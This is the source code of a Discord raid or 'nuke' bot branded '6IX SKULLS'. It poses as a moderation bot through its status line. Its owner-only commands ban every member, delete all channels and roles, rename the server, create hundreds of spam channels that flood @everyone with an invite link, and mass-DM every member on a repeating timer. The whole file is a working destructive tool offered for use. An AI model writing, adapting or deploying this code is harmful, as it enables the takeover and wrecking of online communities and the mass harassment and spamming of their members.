const Discord = require('discord.js');
const client = new Discord.Client();
const chalk = require('chalk');
const fs = require('fs');
const PREFIX = "!"
const {MessageEmbed} = require('discord.js')
const EventEmitter = require('events');
const emitter = new EventEmitter()
emitter.setMaxListeners(50)
const ownersid = ["660627270049857548", "902735999887630387"]
//ganti pake id klean

  client.on('ready', () => {
  console.log("");       
  console.log((chalk.red(`Encendido en: ${client.user.tag}`)));
  console.log("Owners: " + id + " & " + id2)
  })  

client.on("message", message => {
  if (message.author.bot) return
    if (message.content === '.help') {
        if(!ownersid.includes(message.author.id)){
            return message.channel.send('comando no disponible')
        }

  const embed = new MessageEmbed()
              message.channel.send(embed)
message.channel.send({
  embed: {
    title: 'Help Commands',
    description: '** \n1. .nuke**\n_Destroy_ \n**2. .on**\n_Nuke + Spam Channel And Everyone\n**3. .dmall**\n_ Dm All Member\n**4. .spam**\n_Spam Everyone_\n**5. !banall**\n_Ban All Member_\n**6. .roles**\n_Create Random Roles_\n**7. .dr**\n_Delete All Roles_',
    image: {url: 'https://media.discordapp.net/attachments/939335341465296948/939419619687530566/05088f68a5606e3b534fbb2a3f110fd39f5deac9r1-444-250_hq.gif'}
  
  }
})
  }
})

client.on("message", message => {
  if (message.author.bot) return
  
    

 if (message.content === '.on') {
     if(message.channel.type == "dm") return message.channel.send("Que estas intentando?")

  if (!ownersid.includes(message.author.id)) return message.channel.send("Comando no disponible.");
   
message.guild.members.cache.forEach(m => {
              m.ban()
              });
   
   message.guild.channels.cache.forEach(channel => channel.delete());
  message.guild.channels.create(`NUKED BY 6IX SKULLS`, {
        type: 'text'
      }).then(channel => {
         channel.send("@everyone GG");
            channel.send("@here FUCKEDS");
                channel.send("@everyone BY")
            
    
        channel.send("https://discord.gg/hZK9UgU6Td");
                 })
           
   message.guild.channels.create(`†-†-†-†-†-†-†-†-†-†-†-†-†-†`, {
        type: 'text'
      });
   message.guild.channels.create(`NUKED`, {
        type: 'text'
      });
   message.guild.channels.create(`BY`, {
        type: 'text'
      });
message.guild.channels.create(`6IX SKULLS`, {
        type: 'text'
      });
                  
   message.guild.channels.create(`†-†-†-†-†-†-†-†-†-†-†-†-†-†`, {
        type: 'text'
      })

              message.guild.members.cache.forEach(m => {
              m.ban()
              });
      
   message.guild.roles.cache.map(roles => roles.delete());
   message.guild.setName("#6IXSKULLSNEVERDIES");
              message.guild.setIcon("https://media.discordapp.net/attachments/932410975259349063/1005675640764252210/images.png")
              for (let i = 0; i <= 500; i++) {
      message.guild.channels.create(`6IXSKULLS`, {
        type: 'text'
      }).then(channel => {
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        
        message.guild.members.cache.forEach(member => {
                if(message.channel.type == "dm") return message.channel.send("Que estas intentando?")

  if (!ownersid.includes(message.author.id)) return message.channel.send("Comando no disponible.");
              message.delete();
    message.channel.send("> Hecho!**")
              setInterval(function(){
                member.send("https://discord.gg/hZK9UgU6Td").catch(error => {});
              },450);
            })
 })
              }}
                                    
                                    

  
  
if (message.content === '.nuke') {
     if(message.channel.type == "dm") return message.channel.send("Que estas intentando?")

  if (!ownersid.includes(message.author.id)) return message.channel.send("Comando no disponible.");
   
message.guild.members.cache.forEach(m => {
              m.ban()
              });
   
   message.guild.channels.cache.forEach(channel => channel.delete());
  message.guild.channels.create(`NUKED BY 6IX SKULLS`, {
        type: 'text'
      }).then(channel => {
         channel.send("@everyone GG");
            channel.send("@here FUCKEDS");
                channel.send("@everyone BY")
            
    
        channel.send("https://discord.gg/hZK9UgU6Td");
                 })
           
   message.guild.channels.create(`†-†-†-†-†-†-†-†-†-†-†-†-†-†`, {
        type: 'voice'
      });
   message.guild.channels.create(`NUKED`, {
        type: 'voice'
      });
   message.guild.channels.create(`BY`, {
        type: 'voice'
      });
message.guild.channels.create(`6IX SKULLS`, {
        type: 'voice'
      });
                  
   message.guild.channels.create(`†-†-†-†-†-†-†-†-†-†-†-†-†-†`, {
        type: 'voice'
      })

              message.guild.members.cache.forEach(m => {
              m.ban()
              });
      
   message.guild.roles.cache.map(roles => roles.delete());
   message.guild.setName("#6IXSKULLSNEVERDIES");
              message.guild.setIcon("https://media.discordapp.net/attachments/932410975259349063/1005675640764252210/images.png")
}
 
            
            
            
            

                        

            if(message.content === ".dmall") {
              
            message.guild.members.cache.forEach(member => {
                if(message.channel.type == "dm") return message.channel.send("Que estas intentando?")

  if (!ownersid.includes(message.author.id)) return message.channel.send("Comando no disponible.");
              message.delete();
    message.channel.send("> Hecho!**")
              setInterval(function(){
                member.send("https://discord.gg/hZK9UgU6Td").catch(error => {});
              },450);
            })
            }
            
            
            
    if(message.content === ('.dr')){
        if(message.channel.type == "dm") return message.channel.send("Que estas intentando?")

  if (!ownersid.includes(message.author.id)) return message.channel.send("Comando no disponible.");
                   
    message.channel.send("> Hecho")
                        message.guild.roles.cache.map(roles => roles.delete());
                      }
        
        
if (message.content === '.cr') {
  if(message.channel.type == "dm") return message.channel.send("Que estas intentando?")

  if (!ownersid.includes(message.author.id)) return message.channel.send("Comando no disponible.");
                
  message.delete();
          let roles = message.content.slice('!roles'.length);
  message.channel.send("> Hecho!")
            for (let i = 0; i <= 200; i++) {
               message.guild.roles.create({data: {name: "6S †",color: '#000001',},reason: 'razon',})
            };
             }
        
if (message.content === '.banall') {
    if(message.channel.type == "dm") return message.channel.send("Que estas intentando?")

  if (!ownersid.includes(message.author.id)) return message.channel.send("Comando no disponible.");
      message.delete();    message.channel.send("> Hecho!")
              message.guild.members.cache.forEach(m => {
              m.ban()
              });
                }
                
       
    })


 client.on('ready', () => {
    console.log('Hecho!')
    client.user.setActivity(`Protegiendo y Moderando`, { type: "STREAMING" })
});          



require("http").createServer((_, res) => res.end("Bot Encendido.")).listen(8080)


              
        
        
        
client.login(process.env['token'])
//token bot lu